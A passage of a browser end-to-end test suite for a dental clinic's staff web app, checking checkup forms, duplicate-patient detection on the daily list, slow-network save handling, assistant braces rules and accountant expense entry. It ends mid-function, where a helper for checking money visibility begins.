  assert.equal(await first.locator('input[aria-label^="Treatment for"]').inputValue(), 'Root canal');
  assert.equal(await first.getByRole('button', { name: /^Fill in form/ }).count(), 0, 'its form is filled in: no "Fill in form" on the row');
  // the second arrival: "Fill in form" on their row
  const second = checkupRow(page, 'Arrival Second Person');
  const btn = second.getByRole('button', { name: 'Fill in form for Arrival Second Person' });
  assert.equal(await btn.innerText(), 'Fill in form');
  assert.equal(await btn.evaluate((el) => el.closest('td').previousElementSibling.matches('th.name-col')), true, 'in the cell next to the name (Month, which a checkup leaves empty)');
  await btn.click();
  const f = page.locator('.modal', { hasText: 'Checkup form: Arrival Second Person' });
  await f.waitFor();
  assert.equal(await f.getByLabel(/^Mobile number/).inputValue(), '0300 5550963');
  await fillCheckupForm(f, { name: 'Arrival Second Person', checkupFor: 'Extraction', wants: 'No', plan: 'Too busy this month' });
  await f.getByRole('button', { name: 'Save the answers' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.waitForSelector(".toast:has-text(\"Answers saved on Arrival Second Person's checkup.\")");
  await page.waitForFunction(() => document.activeElement?.getAttribute('aria-label') === 'Checkup options for Arrival Second Person');   // (its "Fill in form" is gone: the cursor is on its Options)
  assert.equal(await second.getByRole('button', { name: /^Fill in form/ }).count(), 0, 'the button is gone');
  assert.equal(await second.count(), 1, 'one row, not two');
  assert.equal(await second.locator('select[aria-label^="Status for"]').inputValue(), 'completed');
  assert.equal(await second.locator('input[aria-label^="Treatment for"]').inputValue(), 'Extraction');
  assert.equal(await second.locator('input[aria-label^="Phone for"]').inputValue(), '0300 5550963', 'its phone stays as it was typed on arrival');
  // leave the list as it was
  for (const row of [first, second]) {
    await row.getByRole('button', { name: /Checkup options/ }).click();
    await page.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
    await page.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
    await row.waitFor({ state: 'detached' });
  }
});
// Someone typed into the Google Sheet on arrival often has no phone there: the form finds them on today's list by the name (the site's
// name-fit rule) and offers to fill in their answers, so filling in the form makes no second row; two people of one name can still be two.
await step('Checkups page: the whole form finds someone typed in on arrival without a phone by the name, fills in their answers on that row (and its phone); two people of one name can still be two checkups', async () => {
  await page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    for (const name of ['Arrival Nophone Person', 'Arrival Same Name']) {
      await state.data.addCheckup({ checkup_date: localISO(), branch_id: 2, patient_name: name, phone: null, checkup_for: 'Checkup', day_status: 'waiting', follow_up: 'Not Contacted' });
    }
  });
  await page.goto(BASE + '#/staff/sheet');
  const typedIn = checkupRow(page, 'Arrival Nophone Person');
  await typedIn.waitFor();
  assert.equal(await typedIn.locator('input[aria-label^="Phone for"]').inputValue(), '', 'typed in without a phone');
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  const addBtn = page.getByRole('button', { name: '+ Add checkup patient' });
  await addBtn.click();
  const m = page.locator('.modal').first();
  // the name first, no phone yet: already found
  await m.getByLabel(/^Patient full name/).fill('Arrival  Nophone Person');
  await m.getByLabel(/^Patient full name/).press('Tab');
  const warning = m.locator('.alert-warning', { hasText: 'Already on the list for' });
  await warning.waitFor();
  assert.match(await warning.innerText(), /Already on the list for .+: Arrival Nophone Person \(no phone\)\. Same person\? Fill in the answers on the list, so they are not on the list twice\. Two people with the same name\? Press "Add checkup patient", then "Add as a different person"\./);
  assert.ok(await warning.getByRole('button', { name: 'Fill in the answers for Arrival Nophone Person on the list' }).count(), 'the warning offers to fill in their answers');
  await fillCheckupForm(m, { name: 'Arrival Nophone Person', phone: '0300 5550971', checkupFor: 'Root canal', wants: 'Yes', plan: 'Next Saturday' });
  await m.getByLabel(/^Mobile number/).press('Tab');
  // "Add checkup patient" waits for the check of the name and phone typed now and asks once more (that row has no phone, so it is still
  // found by the name); filling in their answers has focus (the same name letter for letter, no answers yet)
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  const ask = page.locator('.modal', { hasText: 'Two people with the same name? Press "Add as a different person".' });
  await ask.waitFor();
  assert.match(await ask.innerText(), /Arrival Nophone Person \(no phone\) is already on the list for [^.]+\.\s+Same person\? Fill in the answers for Arrival Nophone Person on the list, so they are not on the list twice\.\s+Two people with the same name\? Press "Add as a different person"\./);
  assert.deepEqual(await ask.locator('.modal-actions button').allInnerTexts(), ['Go back', 'Add as a different person', 'Fill in the answers for Arrival Nophone Person on the list']);
  assert.equal(await page.evaluate(() => document.activeElement?.textContent), 'Fill in the answers for Arrival Nophone Person on the list');
  await ask.getByRole('button', { name: 'Fill in the answers for Arrival Nophone Person on the list' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.waitForSelector(".toast:has-text(\"Answers saved on Arrival Nophone Person's checkup.\")");
  // another person of the same name: "Add as a different person" adds a checkup of their own; the first one keeps no answers
  await addBtn.click();
  await m.getByLabel(/^Patient full name/).fill('Arrival Same Name');
  await m.getByLabel(/^Patient full name/).press('Tab');
  await warning.waitFor();
  await fillCheckupForm(m, { name: 'Arrival Same Name', phone: '0300 5550972', checkupFor: 'Braces', wants: 'No', plan: 'Second person plan' });
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await ask.waitFor();
  await ask.getByRole('button', { name: 'Add as a different person' }).click();
  await page.waitForSelector('.toast:has-text("Arrival Same Name added as a checkup patient")');
  await page.waitForSelector('.modal', { state: 'detached' });
  // on today's Aaj ki List: one row for the first person, with the answers and the phone asked in the form
  await page.goto(BASE + '#/staff/sheet');
  await typedIn.waitFor();
  assert.equal(await checkupRow(page, 'Arrival Nophone Person').count(), 1, 'one row, not two');
  assert.equal(await typedIn.locator('select[aria-label^="Status for"]').inputValue(), 'completed');
  assert.equal(await typedIn.locator('input[aria-label^="Treatment for"]').inputValue(), 'Root canal');
  assert.equal(await typedIn.locator('input[aria-label^="Phone for"]').inputValue(), '0300 5550971', 'the row typed in without a phone gets the one asked in the form');
  const twins = checkupRow(page, 'Arrival Same Name');
  await page.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr.is-checkup input[aria-label="Name of checkup patient Arrival Same Name"]').length === 2);
  assert.deepEqual((await twins.locator('input[aria-label^="Phone for"]').evaluateAll((els) => els.map((e) => e.value))).sort(), ['', '0300 5550972'], 'two checkups: the first still without a phone');
  const stored = await page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listDayCheckups({ branchId: 2, date: localISO() })).filter((c) => c.patient_name === 'Arrival Same Name').map((c) => [c.phone, c.treatment_plan]).sort();
  });
  assert.deepEqual(stored, [[null, null], ['0300 5550972', 'Second person plan']], 'the first person keeps no answers');
  // leave the list as it was
  for (const who of ['Arrival Nophone Person', 'Arrival Same Name', 'Arrival Same Name']) {
    const row = checkupRow(page, who).first();
    await row.getByRole('button', { name: /Checkup options/ }).click();
    await page.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
    await page.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
    await page.waitForSelector('.modal', { state: 'detached' });
  }
  await page.waitForFunction(() => !document.querySelector('table.sheet tbody tr.is-checkup input[aria-label^="Name of checkup patient Arrival "]'));
});
// After the checkup the assistant fills in the checkup form from the row itself (owner, 15 Oct 2026): "Fill in form" in the Month cell, which a
// checkup leaves empty, so it is in sight next to the name on a phone too. Options keeps "Fill in the checkup form".
await step('Aaj ki List: a checkup patient put on today\'s list at the desk (Waiting, no answers) gets the checkup form after the checkup from "Fill in form" on the row, in sight on a phone too; the answers make it Completed and the button goes; an earlier day\'s list keeps the whole form', async () => {
  await quickAdd(page, 'Arrival Walk In Person', '0300 5550964');
  await page.waitForSelector('.toast:has-text("Arrival Walk In Person added to today\'s list for North Nazimabad.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  const row = checkupRow(page, 'Arrival Walk In Person');
  await row.waitFor();
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'waiting', 'Waiting, so the doctor sees them as waiting');
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Checkup', 'the treatment is "Checkup" until the form says what it was for');
  assert.equal(await row.locator('input[aria-label^="Doctor\'s name for"]').inputValue(), '', 'no doctor yet');
  const stored = () => page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const c = (await state.data.listDayCheckups({ branchId: 2, date: localISO() })).find((x) => x.patient_name === 'Arrival Walk In Person');
    return [c.day_status, c.doctors, c.ali_recommended, c.pricing_understood, c.wants_treatment, c.treatment_plan, c.source, c.follow_up];
  });
  assert.deepEqual(await stored(), ['waiting', null, null, null, null, null, 'website', 'Not Contacted'], 'no made-up answers go into the checkup list');
  const btn = row.getByRole('button', { name: 'Fill in form for Arrival Walk In Person' });
  assert.equal(await btn.innerText(), 'Fill in form');
  assert.ok(await btn.evaluate((el) => el.scrollWidth <= el.clientWidth), 'its words fit the cell whole');
  await shot(page, 'r30-aaj-fill-in-form');
  // a phone: the Month cell comes right after the name, so the button is in sight without scrolling sideways
  await page.setViewportSize({ width: 390, height: 844 });
  const box = await btn.boundingBox();
  assert.ok(box && box.x >= 0 && box.x + box.width <= 390, `in sight on a 390 px screen: ${box && Math.round(box.x)}-${box && Math.round(box.x + box.width)} px`);
  assert.ok(await btn.evaluate((el) => el.scrollWidth <= el.clientWidth), 'its words fit whole on a phone too');
  await page.setViewportSize({ width: 1366, height: 860 });
  // after the checkup: every question is asked, and the answers make the row Completed
  await btn.click();
  const f = page.locator('.modal', { hasText: 'Checkup form: Arrival Walk In Person' });
  await f.waitFor();
  await f.getByRole('button', { name: 'Save the answers' }).click();
  await f.locator('.field-error').first().waitFor();
  assert.deepEqual(await f.locator('.field-error').allInnerTexts(), ['Choose who did the checkup.', 'Choose whether Dr. Ali recommended the treatment.', 'Choose what the checkup was for.',
    'Choose whether the pricing was understood.', 'Choose whether they want to start the treatment.', 'Write when they want to start, or why not.'], 'every question of the form');
  await fillCheckupForm(f, { name: 'Arrival Walk In Person', checkupFor: 'Braces', ali: 'Yes', pricing: 'Yes', wants: 'Yes', plan: 'Next week' });
  await f.getByRole('button', { name: 'Save the answers' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.waitForSelector(".toast:has-text(\"Answers saved on Arrival Walk In Person's checkup.\")");
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'completed');
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Braces');
  assert.equal(await row.getByRole('button', { name: /^Fill in form/ }).count(), 0, 'the button is gone');
  const [status, doctors, ali, pricing, wants, plan] = await stored();
  assert.deepEqual([status, !!doctors, ali, pricing, wants, plan], ['completed', true, true, 'yes', true, 'Next week'], 'the answers of the form');
  // an earlier day's list: nobody arrives there, so the whole form
  const yesterday = await page.evaluate(async () => { const { addDaysISO, localISO } = await import('/js/ui/dom.js'); return addDaysISO(localISO(), -1); });
  await page.goto(BASE + `#/staff/sheet?date=${yesterday}`);
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = page.locator('.modal').first();
  await m.waitFor();
  assert.deepEqual(await m.locator('.modal-actions button').allInnerTexts(), ['Cancel', 'Add checkup patient']);
  assert.ok(await doctorGroup(m).count() && await forGroup(m).count(), 'the questions of the form');
  assert.equal(await m.getByLabel(/^Which branch did you visit/).inputValue(), 'North Nazimabad');
  // a phone of a patient file: "Add Mr# N to the list instead" asks first when an answer of the form would be thrown away
  await m.getByLabel(/^Patient full name/).fill('Earlier Day Person');
  await m.getByLabel(/^Mobile number/).fill('03010734521');
  await m.getByLabel(/^Mobile number/).press('Tab');
  const fileNote = m.locator('.alert-warning', { hasText: 'already has a patient file' });
  await fileNote.waitFor();
  const fileMr = (await fileNote.innerText()).match(/Mr# (\d+)/)[1];
  await doctorGroup(m).getByRole('checkbox').first().check();
  await m.getByRole('button', { name: `Add Mr# ${fileMr} to the list instead` }).click();
  const ask = page.locator('.modal', { hasText: 'Discard this checkup form?' });
  await ask.getByRole('button', { name: 'Keep filling in' }).click();
  await ask.waitFor({ state: 'detached' });
  assert.equal(await m.getByLabel(/^Patient full name/).inputValue(), 'Earlier Day Person', 'the form stays');
  assert.ok(await doctorGroup(m).getByRole('checkbox').first().isChecked(), 'and its answer');
  // the whole form saved there: on that day's list, Completed, with no "Fill in form" (another phone first: the note goes, and the questions
  // move up, before they are answered)
  await m.getByLabel(/^Mobile number/).fill('0300 5550965');
  await m.getByLabel(/^Mobile number/).press('Tab');
  await fileNote.waitFor({ state: 'detached' });
  await fillCheckupForm(m, { name: 'Earlier Day Person', checkupFor: 'Braces' });
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await page.waitForSelector('.toast:has-text("Earlier Day Person added as a checkup patient.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  const earlier = checkupRow(page, 'Earlier Day Person');
  await earlier.waitFor();
  assert.equal(await earlier.locator('select[aria-label^="Status for"]').inputValue(), 'completed');
  assert.equal(await earlier.locator('input[aria-label^="Treatment for"]').inputValue(), 'Braces');
  assert.equal(await earlier.getByRole('button', { name: /^Fill in form/ }).count(), 0, 'the form is filled in: no "Fill in form"');
  assert.deepEqual(await page.evaluate(async (day) => {
    const { state } = await import('/js/state.js');
    const c = (await state.data.listDayCheckups({ branchId: 2, date: day })).find((x) => x.patient_name === 'Earlier Day Person');
    return [c.checkup_date, c.follow_up, c.day_status];
  }, yesterday), [yesterday, 'Not Contacted', 'completed'], 'saved for that day');
  await removeCheckup(page, earlier);
  // leave today's list as it was
  await page.goto(BASE + '#/staff/sheet');
  await row.waitFor();
  await removeCheckup(page, row);
});
// On a slow line (4G to Supabase) the check for the same phone on today's list comes back after a tap on a save button that follows the last
// digit at once: the add waits for it (the quick add reads today's list when it is pressed), so a person typed into the Google Sheet on arrival
// is not put on the list twice. And while an add is under way nothing closes the dialog (the add would go ahead anyway): it waits, says so,
// and closes once it is saved.
await step('Aaj ki List on a slow line: "Add to the list" tapped right after the last digit of the phone still finds the person on today\'s list (so does the whole form of the Checkups page); while an add is under way (from the press: today\'s list is read first), Escape, the ×, a tap outside, Back and "Add Mr# N to the list instead" wait for it', async () => {
  await page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const d = state.data;
    await d.addCheckup({ checkup_date: localISO(), branch_id: 2, patient_name: 'Race Sheet Person', phone: '0300 5559931', checkup_for: 'Checkup', day_status: 'waiting', follow_up: 'Not Contacted' });
    window.__realListDay = d.listDayCheckups;
    d.listDayCheckups = async (...args) => { await new Promise((r) => setTimeout(r, 400)); return window.__realListDay.apply(d, args); };
  });
  await page.locator('.topnav a:has-text("Today")').click();
  await page.locator('section.today-checkup').waitFor();
  await page.locator('.topnav .menu:has-text("Aaj ki List") > button').click();
  await page.locator('.topnav .menu-list a:text-is("Aaj ki List")').click();
  await checkupRow(page, 'Race Sheet Person').waitFor();
  const m = page.locator('.modal').first();
  const again = page.locator('.modal', { hasText: 'with this phone number' });
  const typePhoneAndTap = async (button) => {
    await m.getByLabel(/^Mobile number/).pressSequentially('03005559931', { delay: 20 });
    await m.getByRole('button', { name: button, exact: true }).click();   // (at once: the check waits for a pause in the typing, then for the server)
  };
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  await m.getByLabel(/^Patient full name/).fill('Race Sheet Person');
  await typePhoneAndTap('Add to the list');
  await m.locator('.alert[role="alert"]').waitFor();
  assert.match(await m.locator('.alert[role="alert"]').innerText(), /^Race Sheet Person \(0300 5559931\) is already on today's list for North Nazimabad, so they are not added again\./, 'the quick add');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  await fillCheckupForm(m, { name: 'Race Sheet Person', checkupFor: 'Braces' });
  await typePhoneAndTap('Add checkup patient');
  await again.waitFor();
  assert.match(await again.innerText(), /Race Sheet Person \(0300 5559931\) is already on the list for .+ with this phone number\./, 'the whole form');
  await again.getByRole('button', { name: 'Go back' }).click();
  await again.waitFor({ state: 'detached' });
  await m.getByRole('button', { name: 'Cancel' }).click();
  await page.locator('.modal', { hasText: 'Discard this checkup form?' }).getByRole('button', { name: 'Discard' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await window.__realListDay.call(state.data, { branchId: 2, date: localISO() })).filter((c) => String(c.phone).replace(/\D/g, '') === '03005559931').length;
  }), 1, 'one checkup with that phone on today\'s list, not two');
  // today's list being read after "Add to the list" (held until the test lets it go; only the quick add's read, not the page's own): Back
  // waits for it too, and the checkup is added once, with the dialog open until then
  await page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    d.listDayCheckups = async (...args) => {
      if (new Error().stack.includes('checkup-actions.js')) await new Promise((r) => { window.__releaseList = r; });
      return window.__realListDay.apply(d, args);
    };
  });
  await page.goto(BASE + '#/staff/sheet');
  await checkupRow(page, 'Race Sheet Person').waitFor();
  await quickAdd(page, 'Back Race Person', '0300 5559933');
  await page.waitForFunction(() => typeof window.__releaseList === 'function');
  await page.goBack();
  await page.waitForTimeout(200);
  assert.equal(await m.locator('h2').innerText(), 'Add a checkup patient', 'the dialog is still open while the list is read');
  assert.match(await page.evaluate(() => location.hash), /^#\/staff\/sheet/, 'Back keeps the page while the list is read');
  await page.evaluate(() => window.__releaseList());
  await page.waitForSelector('.toast:has-text("Back Race Person added to today\'s list for North Nazimabad.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  await checkupRow(page, 'Back Race Person').waitFor();
  // a save under way (held until the test lets it go)
  await page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    d.listDayCheckups = window.__realListDay;
    window.__realAdd = d.addCheckup;
    d.addCheckup = async (...args) => { await new Promise((r) => { window.__releaseSave = r; }); return window.__realAdd.apply(d, args); };
  });
  // (a phone of a patient file: its note is there as Enter adds, and stays while the add is under way)
  await page.getByRole('button', { name: '+ Add checkup patient' }).click();
  await m.getByLabel(/^Patient full name/).fill('Slow Save Person');
  await m.getByLabel(/^Mobile number/).fill('03010734521');
  const instead = m.getByRole('button', { name: /^Add Mr# \d+ to the list instead$/ });
  await instead.waitFor();
  await m.getByLabel(/^Mobile number/).press('Enter');
  await page.waitForFunction(() => typeof window.__releaseSave === 'function');
  const saving = page.locator('.toast', { hasText: 'Saving, wait a moment.' });
  await page.keyboard.press('Escape');
  await saving.waitFor();
  await m.getByRole('button', { name: 'Close' }).click();
  await page.mouse.click(4, 4);   // (the strip around the dialog)
  await page.goBack();
  // "Add Mr# N to the list instead" waits too: the person would be on the list twice
  const patientRows = await page.locator('table.sheet tbody tr:not(.is-checkup)').count();
  await instead.click();
  await page.waitForTimeout(200);
  assert.equal(await page.locator('.modal').count(), 1, 'nothing else opens');
  assert.equal(await m.locator('h2').innerText(), 'Add a checkup patient', 'the dialog is still open');
  assert.match(await page.evaluate(() => location.hash), /^#\/staff\/sheet/, 'Back keeps the page while it saves');
  await page.evaluate(() => window.__releaseSave());
  await page.waitForSelector('.toast:has-text("Slow Save Person added to today\'s list for North Nazimabad.")');
  await page.waitForSelector('.modal', { state: 'detached' });
  await checkupRow(page, 'Slow Save Person').waitFor();
  assert.equal(await page.locator('table.sheet tbody tr:not(.is-checkup)').count(), patientRows, 'no patient row was added: the person is on the list once');
  assert.equal(await reloadAsks(page), false, 'saved: a reload is not asked about');
  // leave today's list as it was
  await page.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.addCheckup = window.__realAdd; });
  for (const who of ['Race Sheet Person', 'Back Race Person', 'Slow Save Person']) {
    const row = checkupRow(page, who);
    await row.getByRole('button', { name: /Checkup options/ }).click();
    await page.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
    await page.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
    await row.waitFor({ state: 'detached' });
  }
});

// ------------------------------------------------------------- assistant + braces rules
const p2 = await newPage();
await step('assistant: braces month guidance and group rule; no Invoice column for someone who does not see invoices', async () => {
  await loginAs(p2, 'Assistant');
  await p2.goto(BASE + '#/staff/sheet?branch=2');
  await p2.waitForSelector('table.sheet tbody tr');
  // (its cells would all be empty: Treatment Details has that room instead)
  const heads = (await p2.locator('table.sheet thead th:visible').allInnerTexts()).map((t) => t.replace('▾', '').trim());
  assert.deepEqual(heads, ['#', 'MR #', 'Patient Name', 'Month', 'Treatment', 'Token', 'Status', 'Group', 'Doctor Name', 'Treatment Details', 'P.P', 'Contact No', 'Reminder Status']);
  assert.equal(await p2.locator('table.sheet col').count(), heads.length, 'one column per heading');
  assert.ok(await p2.locator('table.sheet tbody tr').evaluateAll((trs, n) => trs.every((tr) => tr.children.length === n), heads.length), 'one cell per heading in every row');
  const monthBtn = p2.locator('table.sheet tbody tr .month-pill').first();
  await monthBtn.click();
  await p2.waitForSelector('.modal .stat');
  await shot(p2, '04-braces-guidance');
  await p2.keyboard.press('Escape');
});
await step('a Group 3 doctor is refused on a Group 1/2 month', async () => {
  // Find a waiting braces row whose month allows only Group 1/2 and try a Group 3 doctor
  const rows = p2.locator('table.sheet tbody tr');
  const n = await rows.count();
  let tried = false;
  for (let i = 0; i < n; i++) {
    const hint = await rows.nth(i).locator('.people .field-hint [aria-hidden="true"]').textContent({ timeout: 1000 }).catch(() => '');
    if (hint.startsWith('G1/2') || hint === 'G1 · check G1') {
      await rows.nth(i).locator('.add-person').click();
      await p2.click('.modal button:has-text("Dr. Nida (sample)")');
      await p2.waitForSelector('.toast-error');
      tried = true;
      await p2.keyboard.press('Escape');
      break;
    }
  }
  assert.ok(tried, 'found a Group 1/2 month row to test');
});
await step('photo month cannot be completed without photos', async () => {
  const row = p2.locator('table.sheet tbody tr:has(.photo-due)').first();
  if (await row.count()) {
    await row.locator('select[aria-label^="Status"]').selectOption('completed');
    await p2.waitForSelector('.toast-error');
  }
});
// Staff who work at several branches: the Today page names their own branch, with "Change branch" for a day at another one (covering for
// someone); with no branch of their own the branch is asked.
await step('assistant (every branch): the Today page\'s quick add asks the branch when they have none of their own; with a home branch it is named, and "Change branch" puts the name on another branch\'s list', async () => {
  await p2.locator('.topnav a:has-text("Today")').click();
  const panel = p2.locator('section.today-checkup');
  await panel.waitFor();
  await panel.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = p2.locator('.modal');
  await m.waitFor();
  const lead = () => m.locator('.modal-body .muted').first().innerText();
  assert.deepEqual(await quickFields(m), ['Patient full name', 'Mobile number', 'Branch'], 'no branch of their own: asked');
  assert.ok((await lead()).startsWith("The name goes on today's Aaj ki List of the branch, as Waiting."), await lead());
  assert.equal(await m.getByRole('button', { name: 'Change branch' }).count(), 0);
  await m.getByRole('button', { name: 'Cancel' }).click();
  await p2.waitForSelector('.modal', { state: 'detached' });
  const other = await p2.evaluate(async () => {
    const { state } = await import('/js/state.js');
    window.__homeWas = state.session.staff.home_branch_id;
    state.session.staff.home_branch_id = 2;
    const b = state.ref.branches.find((x) => x.id !== 2);
    return { id: b.id, name: b.name };
  });
  await panel.getByRole('button', { name: '+ Add checkup patient' }).click();
  await m.waitFor();
  assert.deepEqual(await quickFields(m), ['Patient full name', 'Mobile number'], 'their own branch: named, not asked');
  assert.ok((await lead()).startsWith("The name goes on today's Aaj ki List for North Nazimabad, as Waiting."), await lead());
  await m.getByRole('button', { name: 'Change branch' }).click();
  assert.deepEqual(await quickFields(m), ['Patient full name', 'Mobile number', 'Branch']);
  assert.equal(await m.getByLabel(/^Branch/).inputValue(), '2', 'their own branch to start with');
  assert.ok(await m.getByLabel(/^Branch/).evaluate((el) => el === document.activeElement), 'the cursor goes to the branch');
  assert.equal(await m.getByRole('button', { name: 'Change branch' }).count(), 0, 'the button is done with');
  await m.getByLabel(/^Branch/).selectOption(String(other.id));
  assert.ok((await lead()).startsWith(`The name goes on today's Aaj ki List for ${other.name}, as Waiting.`), await lead());
  await m.getByLabel(/^Patient full name/).fill('Other Branch Person');
  await m.getByLabel(/^Mobile number/).fill('0300 5550982');
  await m.getByLabel(/^Mobile number/).press('Enter');
  await p2.waitForSelector(`.toast:has-text("Other Branch Person added to today's list for ${other.name}.")`);
  await p2.waitForSelector('.modal', { state: 'detached' });
  // on that branch's list for today, as Waiting; then everything as it was
  const saved = await p2.evaluate(async (id) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const c = (await state.data.listDayCheckups({ branchId: id, date: localISO() })).find((x) => x.patient_name === 'Other Branch Person');
    if (c) await state.data.deleteCheckup(c.id);
    state.session.staff.home_branch_id = window.__homeWas;
    return c ? [c.branch_id, c.day_status] : null;
  }, other.id);
  assert.deepEqual(saved, [other.id, 'waiting']);
});
// Owner, 15 Oct 2026: "once the checkup is done, the assistant should have options to enter all the details after the checkup".
await step('assistant: a checkup put on today\'s list with the name and phone only shows "Fill in form" on its row (and on the Checkups page); the nine answers make it Completed and the button goes', async () => {
  await p2.goto(BASE + '#/staff/sheet?branch=2');
  await p2.waitForSelector('table.sheet tbody tr');
  await p2.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = p2.locator('.modal');
  await m.waitFor();
  assert.deepEqual(await quickFields(m), ['Patient full name', 'Mobile number'], 'the name and the mobile number only');
  assert.equal(await m.locator('fieldset, input[type=checkbox], input[type=radio]').count(), 0, 'no questions of the form yet');
  await m.getByLabel(/^Patient full name/).fill('Assistant Form Person');
  await m.getByLabel(/^Mobile number/).fill('0300 5550981');
  await m.getByRole('button', { name: 'Add to the list' }).click();
  await p2.waitForSelector('.toast:has-text("Assistant Form Person added to today\'s list for North Nazimabad.")');
  const row = checkupRow(p2, 'Assistant Form Person');
  await row.waitFor();
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'waiting');
  const btn = row.getByRole('button', { name: 'Fill in form for Assistant Form Person' });
  assert.ok(await btn.isVisible(), '"Fill in form" on the row');
  await row.getByRole('button', { name: /Checkup options/ }).click();
  assert.equal(await p2.locator('.modal').getByRole('button', { name: 'Fill in the checkup form' }).count(), 1, 'and in its Options');
  await p2.keyboard.press('Escape');
  await p2.waitForSelector('.modal', { state: 'detached' });
  // the Checkups page offers it too, for a waiting checkup
  await p2.goto(BASE + '#/staff/checkups?q=5550981');
  const listed = p2.locator('table.checkup-table tbody tr[data-id]', { hasText: 'Assistant Form Person' });
  await listed.waitFor();
  assert.equal(await listed.getByRole('button', { name: 'Fill in form for Assistant Form Person' }).count(), 1, 'on the Checkups page too');
  await p2.goto(BASE + '#/staff/sheet?branch=2');
  await row.waitFor();
  await btn.click();
  const f = p2.locator('.modal', { hasText: 'Checkup form: Assistant Form Person' });
  await f.waitFor();
  assert.equal(await f.getByLabel(/^Patient full name/).inputValue(), 'Assistant Form Person');
  assert.equal(await f.getByLabel(/^Mobile number/).inputValue(), '0300 5550981');
  await fillCheckupForm(f, { name: 'Assistant Form Person', checkupFor: 'Braces', ali: 'Yes', pricing: 'Yes', wants: 'Yes', plan: 'Next month' });
  await f.getByRole('button', { name: 'Save the answers' }).click();
  await p2.waitForSelector('.modal', { state: 'detached' });
  await p2.waitForSelector(".toast:has-text(\"Answers saved on Assistant Form Person's checkup.\")");
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'completed', 'the answers make it Completed');
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Braces');
  assert.equal(await row.getByRole('button', { name: /^Fill in form/ }).count(), 0, 'the button is gone');
  await row.getByRole('button', { name: /Checkup options/ }).click();
  const opts = p2.locator('.modal');
  assert.equal(await opts.getByRole('button', { name: 'Fill in the checkup form' }).count(), 0, 'and from its Options');
  assert.match(await opts.innerText(), /Wants to start\s+Yes/);
  await p2.keyboard.press('Escape');
  await p2.waitForSelector('.modal', { state: 'detached' });
  await p2.goto(BASE + '#/staff/checkups?q=5550981');
  await listed.waitFor();
  assert.equal(await listed.getByRole('button', { name: /^Fill in form/ }).count(), 0, 'nor on the Checkups page');
  // leave the list as it was
  await p2.goto(BASE + '#/staff/sheet?branch=2');
  await row.waitFor();
  await removeCheckup(p2, row);
});

// ------------------------------------------------------------- accountant
const p3 = await newPage();
await step('accountant: P&L, expense entry and cash verification', async () => {
  await loginAs(p3, 'Accountant');
  await p3.goto(BASE + '#/staff/accounts');
  await p3.waitForSelector('.tab');
  await p3.getByRole('tab', { name: 'Expenses', exact: true }).click();
  await p3.getByLabel('Category').selectOption({ label: 'Rent' });
  await p3.getByLabel('Amount').fill('120000');
  await p3.locator('input[aria-label="Receipt photo"]').setInputFiles({ name: 'rent-receipt.png', mimeType: 'image/png', buffer: Buffer.from('89504e470d0a1a0a', 'hex') });
  await p3.click('button:has-text("Save expense")');
  await p3.waitForSelector('.toast:has-text("Expense")');
  await p3.waitForSelector('table.list tbody tr:has-text("Rent") button:has-text("View")');
  await p3.click('.tab:has-text("Branch income")');
  await p3.waitForSelector('table.list');
  await shot(p3, '05-accounts');
});

// ------------------------------------------------------------- the clinic's money: Dr. Ali and accounts only
// The owner (15 Oct 2026): "no one can see the overall finances of the clinic except me and accounts. no assistant can see the income,
// only front desk can see the daily payments with each payment along with patient name. but not the full amount". One page, the
// grid set as the clinic has it live, then each role in turn (the demo keeps its data while the page is open).
// Every "Rs 1,234" in the page's main area outside the elements that may show money (a patient's own dues, a single payment).
const rupeesShown = (pg, allowed = null) => pg.locator('main').evaluate((main, allowedSel) => {
  const out = [];
  const walk = document.createTreeWalker(main, NodeFilter.SHOW_TEXT);
